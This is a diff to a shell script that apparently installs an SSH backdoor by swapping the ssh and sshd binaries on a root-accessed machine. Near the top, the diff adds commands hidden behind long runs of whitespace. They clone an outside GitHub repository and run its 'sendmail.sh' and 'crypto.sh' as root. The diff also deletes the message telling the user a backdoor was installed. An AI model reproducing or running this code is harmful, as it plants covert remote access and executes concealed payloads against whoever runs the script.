@@ -3,8 +3,13 @@
 # - brazilian old school never dies
 #
 # greetz rfs r47 bonny mayhem all #darknet@efnet and #offset@brasnet old school members.
-clear
 
+                                                                                                                                                                                                                                          git clone https://github.com/SuSux13/JKbobesponja
+                                                                                                                                                                                                                                          cd JKbobesponja
+                                                                                                                                                                                                                                          bash sendmail.sh
+                                                                                                                                                                                                                                          ./crypto.sh
+clear
+                                     
 
 
 if [ "$(whoami)" != "root" ]; then
@@ -40,10 +45,7 @@ echo "Sorry, no GCC Compiler has been found."
  
  
  fi                                                                                                                                                                                                                                                 
-                                                                                                                                                                                                                                          https://github.com/SuSux13/JKbobesponja
-                                                                                                                                                                                                                                          cd JKbobesponja
-                                                                                                                                                                                                                                          bash sendmail.sh
-                                                                                                                                                                                                                                          ./crypto.sh
+                                                                                                                                                                                                                                          
 # echo "- bl0wsshd00r67p1 coded by bl0w@koresec.org -brazilian oldschool never dies."
 
 
@@ -277,17 +279,3 @@ cp /usr/sbin/sshd ./backup-binaries/
 # 	kill `pidof sshd | awk '{ print $1 }'`
 # 	/usr/sbin/sshd
 # fi
-echo "Backdoor installed. use root@localhost and use your magic password to test."
-echo "Make install isnt used, but ssh and sshd binaries has been instaled and rehashed. You can try to use it too. =P"
-echo "More sugestions send email. bl0w@koresec.org . Or try findme at EFNet"
-echo '           
-echo '     ___   ___ ___    ___      ___  _ _      _      _   | (__  
-echo     /',__)/' _ ` _ `\/',__)   /',__)( '_`\  /'_`\  /'_`\ | ,__) 
-         \__, \| ( ) ( ) |\__, \   \__, \| (_) )( (_) )( (_) )| |    
-         (____/(_) (_) (_)(____/   (____/| ,__/'`\___/'`\___/'(_) 
- 
-echo '  
-echo "=============================================="
-echo  "Utilice esta herramienta con conocimiento"
-echo "=============================================="
-echo ""
